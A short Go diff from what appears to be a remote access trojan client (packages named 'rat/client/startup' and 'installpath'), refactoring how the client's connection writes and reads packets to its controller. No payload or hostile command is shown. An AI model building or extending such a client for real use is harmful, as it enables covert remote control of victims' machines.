@@ -9,6 +9,7 @@ import (
 	"rat/client/startup"
 	"rat/common"
 	"rat/common/installpath"
+	"rat/network"
 	"time"
 )
 
@@ -56,7 +57,9 @@ func start(config common.BinaryConfig) {
 		})
 
 		con := Connection{
-			Conn: conn,
+			Conn:   conn,
+			Writer: network.Writer{conn},
+			Reader: network.Reader{conn},
 		}
 
 		if err != nil {
@@ -64,12 +67,13 @@ func start(config common.BinaryConfig) {
 			goto end
 		}
 
-		Queue = make(chan OutgoingPacket)
+		Queue = make(chan network.OutgoingPacket)
 		Transfers = make(TransfersMap)
 
 		go func() {
 			for {
 				packet := <-Queue
+				packet.Init()
 				con.WritePacket(packet)
 			}
 		}()
@@ -86,7 +90,7 @@ func start(config common.BinaryConfig) {
 			}
 
 			packet := GetIncomingPacket(header)
-			err = packet.Read(&con)
+			packet, err = con.Reader.ReadPacket(packet)
 
 			if err != nil {
 				fmt.Println(err.Error())
